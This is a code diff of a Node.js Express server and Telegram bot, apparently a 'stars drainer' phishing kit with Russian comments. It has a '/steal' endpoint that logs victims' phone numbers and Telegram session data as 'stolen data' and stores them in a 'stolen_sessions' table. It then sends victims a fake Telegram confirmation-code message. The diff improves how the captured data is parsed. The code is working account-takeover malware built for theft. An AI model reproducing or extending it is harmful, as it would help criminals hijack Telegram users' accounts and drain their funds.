@@ -60,26 +60,39 @@ app.post('/steal', (req, res) => {
     console.log('=== УКРАДЕННЫЕ ДАННЫЕ ===');
     console.log('Номер:', req.body.phone);
     console.log('Stage:', req.body.stage);
-    console.log('TG Data:', req.body.tg_data);
+    console.log('TG Data raw:', req.body.tg_data);
     console.log('========================');
     
     if (req.body.stage === 'phone_entered') {
         try {
-            // Парсим tg_data из строки в объект
-            const tgData = JSON.parse(req.body.tg_data);
-            const userId = tgData.user?.id;
+            // tg_data приходит как URL-encoded строка, нужно распарсить
+            const urlParams = new URLSearchParams(req.body.tg_data);
+            const userStr = urlParams.get('user');
             
-            db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
-                [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
-            
-            // Отправляем код в Telegram пользователю если есть ID
-            if (userId) {
-                const code = Math.floor(10000 + Math.random() * 90000);
-                bot.sendMessage(userId, `Код подтверждения Telegram: ${code}`)
-                    .then(() => console.log(`✅ Код ${code} отправлен пользователю ${userId}`))
-                    .catch(e => console.log('❌ Не удалось отправить код:', e));
+            if (userStr) {
+                const userData = JSON.parse(decodeURIComponent(userStr));
+                const userId = userData.id;
+                
+                console.log('User ID из tg_data:', userId);
+                
+                db.run(`INSERT INTO stolen_sessions (phone, tg_data, user_id, status) VALUES (?, ?, ?, ?)`, 
+                    [req.body.phone, req.body.tg_data, userId, 'awaiting_code']);
+                
+                // Отправляем код в Telegram пользователю
+                if (userId) {
+                    const code = Math.floor(10000 + Math.random() * 90000);
+                    bot.sendMessage(userId, `Код подтверждения Telegram: ${code}`)
+                        .then(() => console.log(`✅ Код ${code} отправлен пользователю ${userId}`))
+                        .catch(e => {
+                            if (e.response && e.response.statusCode === 403) {
+                                console.log('❌ Бот заблокирован пользователем, невозможно отправить код');
+                            } else {
+                                console.log('❌ Не удалось отправить код:', e.message);
+                            }
+                        });
+                }
             } else {
-                console.log('⚠️ Не удалось получить ID пользователя для отправки кода');
+                console.log('⚠️ Не удалось извлечь user из tg_data');
             }
                 
         } catch (error) {
@@ -135,6 +148,13 @@ const PORT = process.env.PORT || 8080;
 app.listen(PORT, '0.0.0.0', () => {
     console.log(`✅ Сервер работает на порту ${PORT}`);
     console.log(`✅ Домен: starsdrainer-production.up.railway.app`);
+});
+
+// Логирование входящих сообщений
+bot.on('message', (msg) => {
+    if (msg.text && msg.text.startsWith('/')) {
+        console.log(`Command received: ${msg.text} from ${msg.from.id}`);
+    }
 });
 
 // Команда /balance - проверка баланса
@@ -251,7 +271,7 @@ bot.on('inline_query', (query) => {
         }];
     }
     
-    console.log('Inline results:', results);
+    console.log('Inline results:', results.length);
     bot.answerInlineQuery(query.id, results).catch(e => console.log('Inline error:', e));
 });
 
@@ -289,7 +309,7 @@ bot.onText(/@MyStarBank_bot (\d+)(?:\s+(\d+))?/, (msg, match) => {
                     ]]
                 }
             }).catch(e => {
-                console.log('❌ Ошибка отправки фото:', e);
+                console.log('❌ Ошибка отправки фото:', e.message);
                 // Если фото не отправляется, отправляем текст
                 bot.sendMessage(chatId, checkText, {
                     reply_markup: {
